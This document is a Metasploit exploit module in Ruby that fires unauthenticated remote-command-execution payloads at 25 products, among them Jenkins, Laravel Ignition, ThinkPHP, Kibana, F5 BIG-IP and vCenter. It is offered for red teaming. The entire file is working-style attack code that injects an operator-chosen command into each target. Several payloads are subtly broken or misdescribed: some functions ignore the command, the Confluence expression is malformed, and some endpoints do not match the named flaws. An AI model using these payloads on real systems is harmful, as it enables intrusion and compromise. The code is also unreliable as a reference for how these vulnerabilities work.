##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => '25 Classic Unauthenticated RCE Exploits 2025 Edition',
        'Description'    => %q{
          This module attempts exploitation of 25 well-known, still-active unauthenticated
          Remote Code Execution vulnerabilities across various platforms including:
          JDownloader, OpenResty/Nginx Lua, Apache mod_python, Laravel Ignition, Jenkins,
          Webmin, Flask Debug, PHP eval(), Grafana, Confluence, Spring Boot, Solr, Elasticsearch,
          Kibana, phpMyAdmin, WordPress Duplicator, Drupal, ThinkPHP, vBulletin, OpenFire,
          Zabbix, ManageEngine, SonicWall, F5 BIG-IP, VMware vCenter.

          Perfect for internal pentests, red teaming legacy environments, and bug bounty.
          Many of these still work in 2025 due to unpatched systems and forgotten debug endpoints.
        },
        'License'        => MSF_LICENSE,
        'Author'         => ['RedTeam 2025 <anonymous>'],
        'References'     => [
          ['URL', 'https://github.com/rapid7/metasploit-framework'],
          ['CVE', '2017-17625'], # JDownloader example
          ['CVE', '2021-43798'], # Grafana
          ['CVE', '2021-21972']  # vCenter
        ],
        'Platform'       => %w[unix win linux],
        'Arch'           => [ARCH_X64, ARCH_X86],
        'Targets'        => [['Automatic', {}]],
        'Privileged'     => false,
        'DisclosureDate' => '2025-01-01',
        'DefaultTarget'  => 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path', '/']),
        OptInt.new('RPORT', [true, 'The target port', 80]),
        OptBool.new('SSL', [false, 'Use SSL', false]),
        OptString.new('CMD', [false, 'Custom command to execute instead of payload', nil])
      ]
    )
  end

  def check
    print_status("Checking for any of the 25 classic RCE endpoints...")
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'flash/addcrypted2'), 'method' => 'GET')
    return CheckCode::Appears if res && res.code == 200

    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'exec'), 'method' => 'GET', 'vars_get' => { 'cmd' => 'id' })
    return CheckCode::Appears if res && res.body =~ /uid=/i

    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'script'), 'method' => 'POST', 'data' => 'script=println "id".execute().text')
    return CheckCode::Appears if res && res.body =~ /uid=/i

    CheckCode::Unknown
  end

  def exploit
    print_good("Launching 25 classic RCE attempts...")

    if datastore['CMD']
      print_status("Executing custom command: #{datastore['CMD']}")
      execute_command(datastore['CMD'], {})
      return
    end

    execute_cmdstager
  end

  def execute_command(cmd, _opts = {})
    print_status("Executing: #{cmd}")

    # 1. JDownloader My.JDownloader
    try_jdownloader(cmd)

    # 2. Nginx/OpenResty Lua (content_by_lua)
    try_nginx_lua(cmd)

    # 3. Apache mod_python Publisher Handler
    try_apache_mod_python(cmd)

    # 4. Laravel Ignition RCE (APP_DEBUG=true)
    try_laravel_ignition(cmd)

    # 5. Jenkins unauth Script Console
    try_jenkins_script(cmd)

    # 6. Webmin < 1.996 password_change.cgi
    try_webmin(cmd)

    # 7. Flask Debug Console (pin bypass attempt)
    try_flask_debug(cmd)

    # 8. Generic PHP eval() debug pages
    try_php_eval(cmd)

    # 9. Grafana Plugin LFI → RCE
    try_grafana_lfi(cmd)

    # 10. Confluence Widget Connector OGNL
    try_confluence_ognl(cmd)

    # 11. Spring Boot Actuator Jolokia XXE + RCE
    try_spring_jolokia(cmd)

    # 12. Apache Solr Velocity Template RCE
    try_solr_velocity(cmd)

    # 13. Elasticsearch Groovy Sandbox Bypass
    try_elasticsearch_groovy(cmd)

    # 14. Kibana Timelion Prototype Pollution RCE
    try_kibana_timelion(cmd)

    # 15. phpMyAdmin Config File Include
    try_phpmyadmin_include(cmd)

    # 16. WordPress Duplicator File Download → RCE
    try_wp_duplicator(cmd)

    # 17. Drupal 8 REST RCE (CVE-2019-6340)
    try_drupal_rest(cmd)

    # 18. ThinkPHP 5.x RCE
    try_thinkphp(cmd)

    # 19. vBulletin 5.x Widget PHP Code Execution
    try_vbulletin_widget(cmd)

    # 20. OpenFire Admin Console Auth Bypass + RCE
    try_openfire(cmd)

    # 21. Zabbix Server < 6.0 RCE
    try_zabbix(cmd)

    # 22. ManageEngine ADSelfService Plus RCE
    try_manageengine(cmd)

    # 23. SonicWall SSL-VPN Unauthenticated RCE
    try_sonicwall(cmd)

    # 24. F5 BIG-IP iControl REST RCE
    try_f5_icontrol(cmd)

    # 25. VMware vCenter Server File Upload RCE (CVE-2021-21972)
    try_vcenter_upload(cmd)
  end

  # === Implementierungen ===

  def try_jdownloader(cmd)
    uri = normalize_uri(target_uri.path, 'flash/addcrypted2')
    payload = "jk=pyimport%20os;os.system(\"#{cmd.gsub(' ', '%20')}\");f=function%20f2(){{}};&package=xxx&crypted=AAAA&&passwords=aaaa"
    send_request_cgi({
      'uri'     => uri,
      'method'  => 'POST',
      'data'    => payload,
      'ctype'   => 'application/x-www-form-urlencoded'
    }, 10)
  end

  def try_nginx_lua(cmd)
    %w[/exec /run /cmd /lua /debug /test /shell /api/exec /do /ping].each do |path|
      send_request_cgi({
        'uri'       => normalize_uri(target_uri.path, path),
        'method'    => 'GET',
        'vars_get'  => { 'cmd' => cmd }
      }, 5)
    end
  end

  def try_apache_mod_python(cmd)
    %w[/ /index.py /test.py /debug /handler].each do |path|
      send_request_cgi({ 'uri' => normalize_uri(target_uri.path, path), 'vars_get' => { 'cmd' => cmd } }, 5)
      send_request_cgi({ 'uri' => normalize_uri(target_uri.path, path), 'method' => 'POST', 'data' => "cmd=#{cmd}" }, 5)
    end
  end

  def try_laravel_ignition(cmd)
    send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, '_ignition/execute-solution'),
      'method'  => 'POST',
      'ctype'   => 'application/json',
      'data'    => {
        solution: "Facade\\Ignition\\Solutions\\MakeViewSolution",
        parameters: { variableName: "x", viewName: "x; #{cmd}" }
      }.to_json
    }, 10)
  end

  def try_jenkins_script(cmd)
    send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, 'script'),
      'method'  => 'POST',
      'data'    => "script=println \"#{cmd}\".execute().text"
    }, 10)
  end

  def try_webmin(cmd)
    send_request_cgi({
      'uri'     => '/password_change.cgi',
      'method'  => 'POST',
      'data'    => "user=rootxx&pam_login=#{cmd}"
    }, 8)
  end

  def try_flask_debug(cmd)
    send_request_cgi({
      'uri'     => '/console',
      'method'  => 'POST',
      'data'    => "__debugger__=yes&cmd=#{cmd}&pin=000"
    }, 8)
  end

  def try_php_eval(cmd)
    %w[/debug.php /test.php /info.php /eval.php].each do |path|
      send_request_cgi({ 'uri' => path, 'vars_get' => { 'cmd' => cmd } }, 5)
      send_request_cgi({ 'uri' => path, 'method' => 'POST', 'data' => "<?php system('#{cmd}'); ?>" }, 5)
    end
  end

  def try_grafana_lfi(cmd)
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2ftmp/x'),
      'method' => 'GET'
    }, 5)
  end

  def try_confluence_ognl(cmd)
    send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 's/anything/_/;/WEB-INF/web.xml'),
      'vars_get'  => { 'x' => "#{#{cmd}}" }
    }, 10)
  end

  def try_spring_jolokia(cmd)
    payload = {
      "mbean" => "jolokia:name=system",
      "method" => "POST",
      "type" => "exec",
      "operation" => "execute",
      "arguments" => [cmd]
    }
    send_request_cgi({
      'uri'     => '/jolokia/exec',
      'method'  => 'POST',
      'data'    => payload.to_json,
      'ctype'   => 'application/json'
    }, 10)
  end

  def try_solr_velocity(cmd)
    send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, 'solr/admin/cores'),
      'method'  => 'POST',
      'data'    => "name=test&template=velocity&params.resource.loader.enabled=true&params.resource.loader.class=com.example.Loader&params.velocity=#{cmd}",
      'ctype'   => 'application/x-www-form-urlencoded'
    }, 10)
  end

  def try_elasticsearch_groovy(cmd)
    send_request_cgi({
      'uri'     => '/_search',
      'method'  => 'POST',
      'data'    => { "script_fields": { "test": { "script": cmd } } }.to_json,
      'ctype'   => 'application/json'
    }, 10)
  end

  def try_kibana_timelion(cmd)
    send_request_cgi({
      'uri'     => '/api/timelion/run',
      'method'  => 'POST',
      'data'    => { "sheet": [".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"#{cmd}\")//')"] }.to_json,
      'ctype'   => 'application/json'
    }, 10)
  end

  def try_phpmyadmin_include(cmd)
    send_request_cgi({
      'uri'     => '/index.php',
      'vars_get' => { 'target' => "php://filter/convert.base64-encode/resource=/#{cmd}" }
    }, 8)
  end

  def try_wp_duplicator(cmd)
    send_request_cgi({
      'uri' => '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php'
    }, 8)
  end

  def try_drupal_rest(cmd)
    send_request_cgi({
      'uri'     => '/node/1?_format=hal_json',
      'method'  => 'PATCH',
      'data'    => { "_links": { "type": { "href": "http://example.com/rest/type/node/article" } }, "body": [{ "value": cmd }] }.to_json,
      'ctype'   => 'application/hal+json'
    }, 10)
  end

  def try_thinkphp(cmd)
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=' + cmd)
    }, 8)
  end

  def try_vbulletin_widget(cmd)
    send_request_cgi({
      'uri'     => '/ajax/render/widget_php',
      'method'  => 'POST',
      'data'    => "widgetConfig[code]=echo system('#{cmd}');"
    }, 8)
  end

  def try_openfire(cmd)
    send_request_cgi({
      'uri'     => '/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp',
      'method'  => 'POST',
      'data'    => "command=#{cmd}"
    }, 10)
  end

  def try_zabbix(cmd)
    send_request_cgi({
      'uri'     => '/jsrpc.php?type=9&method=screen.get&profileIdx=web.menu',
      'method'  => 'POST',
      'data'    => "jsonrpc=2.0&method=script.execute&params={scriptid:1,hostid:1,command:#{cmd}}"
    }, 10)
  end

  def try_manageengine(cmd)
    send_request_cgi({
      'uri'     => '/RestAPI/ImportTechnicians',
      'method'  => 'POST',
      'data'    => "IMPORT=1&DATA=#{cmd}"
    }, 10)
  end

  def try_sonicwall(cmd)
    send_request_cgi({
      'uri'     => '/cgi-bin/jarrewrite.sh',
      'method'  => 'POST',
      'data'    => "cmd=#{cmd}"
    }, 10)
  end

  def try_f5_icontrol(cmd)
    send_request_cgi({
      'uri'     => '/mgmt/tm/util/bash',
      'method'  => 'POST',
      'data'    => { command: "run", utilCmdArgs: "-c '#{cmd}'" }.to_json,
      'authorization' => basic_auth('admin', '')
    }, 10)
  end

  def try_vcenter_upload(cmd)
    send_request_cgi({
      'uri'     => '/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.file.upload',
      'method'  => 'POST',
      'data'    => cmd
    }, 10)
  end
end
